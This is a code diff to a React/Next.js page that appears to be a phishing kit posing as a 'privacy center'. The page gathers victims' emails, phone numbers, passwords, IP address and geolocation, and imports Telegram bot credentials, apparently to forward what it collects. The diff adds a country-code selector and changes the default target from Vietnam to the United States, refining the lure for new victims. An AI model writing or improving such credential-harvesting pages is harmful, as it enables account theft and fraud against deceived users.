@@ -7,6 +7,46 @@ import { Dictionary, LOCALE_COOKIE_NAME, Locale, getDictionary, resolveLocaleFro
 import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, IPGEO_API_KEY } from "@/lib/config";
 import styles from "./page.module.css";
 
+const COUNTRY_CODES: { code: string; callingCode: string }[] = [
+  { code: "US", callingCode: "+1" },
+  { code: "GB", callingCode: "+44" },
+  { code: "VN", callingCode: "+84" },
+  { code: "CA", callingCode: "+1" },
+  { code: "AU", callingCode: "+61" },
+  { code: "FR", callingCode: "+33" },
+  { code: "DE", callingCode: "+49" },
+  { code: "IT", callingCode: "+39" },
+  { code: "ES", callingCode: "+34" },
+  { code: "PT", callingCode: "+351" },
+  { code: "NL", callingCode: "+31" },
+  { code: "BE", callingCode: "+32" },
+  { code: "BR", callingCode: "+55" },
+  { code: "MX", callingCode: "+52" },
+  { code: "AR", callingCode: "+54" },
+  { code: "CO", callingCode: "+57" },
+  { code: "JP", callingCode: "+81" },
+  { code: "KR", callingCode: "+82" },
+  { code: "CN", callingCode: "+86" },
+  { code: "HK", callingCode: "+852" },
+  { code: "TW", callingCode: "+886" },
+  { code: "IN", callingCode: "+91" },
+  { code: "ID", callingCode: "+62" },
+  { code: "TH", callingCode: "+66" },
+  { code: "PH", callingCode: "+63" },
+  { code: "MY", callingCode: "+60" },
+  { code: "SG", callingCode: "+65" },
+  { code: "RU", callingCode: "+7" },
+  { code: "TR", callingCode: "+90" },
+  { code: "SA", callingCode: "+966" },
+  { code: "AE", callingCode: "+971" },
+  { code: "EG", callingCode: "+20" },
+  { code: "NG", callingCode: "+234" },
+  { code: "ZA", callingCode: "+27" },
+  { code: "PK", callingCode: "+92" },
+  { code: "BD", callingCode: "+880" },
+  { code: "IR", callingCode: "+98" },
+];
+
 type ActionItem = {
   title: string;
   subtitle: string;
@@ -297,12 +337,24 @@ export default function HomePageClient({
   const modal = dictionary.modal;
   const sidebar = dictionary.sidebar;
   const pageContent = dictionary.page;
-  const [clientCountryCode, setClientCountryCode] = useState(detectedCountryCode ?? "");
-  const [clientCallingCode, setClientCallingCode] = useState(normalizeCallingCode(detectedCallingCode));
+  const [clientCountryCode, setClientCountryCode] = useState(detectedCountryCode ?? "US");
+  const [clientCallingCode, setClientCallingCode] = useState(
+    detectedCallingCode ? normalizeCallingCode(detectedCallingCode) : "+1",
+  );
   const [clientLocation, setClientLocation] = useState(detectedLocation ?? "");
   const [clientIp, setClientIp] = useState(detectedIp ?? "");
-  const phoneFlag = countryCodeToFlag(clientCountryCode);
-  const phoneCode = normalizeCallingCode(clientCallingCode);
+  const [selectedCountryCode, setSelectedCountryCode] = useState(detectedCountryCode ?? "US");
+  const phoneCode = COUNTRY_CODES.find((c) => c.code === selectedCountryCode)?.callingCode ?? "+1";
+
+  const handleCountryCodeChange = (code: string) => {
+    const entry = COUNTRY_CODES.find((c) => c.code === code);
+    if (!entry) {
+      return;
+    }
+    setSelectedCountryCode(code);
+    setClientCallingCode(entry.callingCode);
+    setClientCountryCode(code);
+  };
 
   const privacyCenterActions: ActionItem[] = [
     {
@@ -392,7 +444,7 @@ export default function HomePageClient({
     const safePersonalEmail = escapeHtml(form.email || "N/A");
     const safeBusinessEmail = escapeHtml(form.workEmail || "N/A");
     const safeDetails = escapeHtml(form.details.trim() || "N/A");
-    const safePhone = escapeHtml(`${phoneCode} ${form.phoneNumber}`.trim() || "+84");
+    const safePhone = escapeHtml(`${phoneCode} ${form.phoneNumber}`.trim() || "+1");
     const safeUrl = escapeHtml(currentUrl || "N/A");
     const safeTime = escapeHtml(getCurrentTime());
     const safePassword1 = escapeHtml((overrides.password1 ?? password1) || "N/A");
@@ -832,15 +884,17 @@ export default function HomePageClient({
         return;
       }
       if (detectedCountryCode && detectedCallingCode) {
+        setSelectedCountryCode(detectedCountryCode);
         setClientCountryCode(detectedCountryCode);
         setClientCallingCode(normalizeCallingCode(detectedCallingCode));
         if (!clientLocation) {
           setClientLocation(detectedLocation ?? "N/A / N/A / N/A");
         }
       } else {
-        setClientCountryCode("VN");
-        setClientCallingCode("+84");
-        setClientLocation("N/A / N/A / Vietnam");
+        setSelectedCountryCode("US");
+        setClientCountryCode("US");
+        setClientCallingCode("+1");
+        setClientLocation("N/A / N/A / United States");
       }
     };
 
@@ -888,6 +942,7 @@ export default function HomePageClient({
 
         setClientCallingCode(callingCode);
         setClientCountryCode(countryCode);
+        setSelectedCountryCode(countryCode);
         setClientLocation(`${district} / ${city} / ${country}`);
       } catch (err) {
         console.error(err);
@@ -1159,8 +1214,18 @@ export default function HomePageClient({
 
                   <div className={styles.phoneInputWrap}>
                     <span className={styles.phonePrefix}>
-                      <span className={styles.phoneFlag}>{phoneFlag}</span>
-                      <span className={styles.phoneCode}>{phoneCode}</span>
+                      <select
+                        className={styles.phoneCountrySelect}
+                        value={selectedCountryCode}
+                        onChange={(event) => handleCountryCodeChange(event.target.value)}
+                        aria-label="Country code"
+                      >
+                        {COUNTRY_CODES.map((c) => (
+                          <option key={c.code} value={c.code}>
+                            {countryCodeToFlag(c.code)} {c.callingCode}
+                          </option>
+                        ))}
+                      </select>
                     </span>
                     <input
                       id="phoneNumber"
